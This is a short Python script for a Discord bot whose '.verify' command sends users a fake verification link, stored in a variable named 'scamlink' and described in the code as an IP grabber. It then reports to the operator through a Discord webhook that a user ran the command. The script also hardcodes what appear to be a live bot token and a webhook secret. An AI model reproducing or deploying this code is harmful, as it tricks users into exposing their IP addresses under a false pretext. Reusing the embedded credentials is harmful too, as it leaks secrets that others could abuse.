import discord 
from discord.ext import commands
import os
import time
import string
import random
import threading
import requests
import json

scamlink = "https://maper.info/2n5Q08"

token = "OTMzNDgxODU2MDAxNzc3NzE0.G3siIE.Y2pCFfLPpweVPXhP9HGkb08VlBEW5jWh363Wk8"

webhook = "https://discord.com/api/webhooks/1014376854301462538/C_iMkvJZZze0j0NoXLd_qiKytvoXNSIBMJ2HfmlEfy9Pqcc504ZHApW7oCb8R9ytJIZE"

prefix = "!"

msg = "someone has done the command please check ur ip grabber"

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@bot.command()
async def verify(ctx):
 embed = discord.Embed(title='Verify',description=f'Click To Verify {scamlink}')
 await ctx.author.send(embed=embed)
 username = "Webhook"
 ctx.author = ctx.author
 message = f"{ctx.author} has clicked the verify button"
 webhook = "https://discord.com/api/webhooks/1014376854301462538/C_iMkvJZZze0j0NoXLd_qiKytvoXNSIBMJ2HfmlEfy9Pqcc504ZHApW7oCb8R9ytJIZE"
 data = json.dumps({
        "content": message,
        "username": username,
    })
 header = {
        "content-type": "application/json"
    }
 response = requests.post(webhook, data, headers=header)
 
bot.run(token)
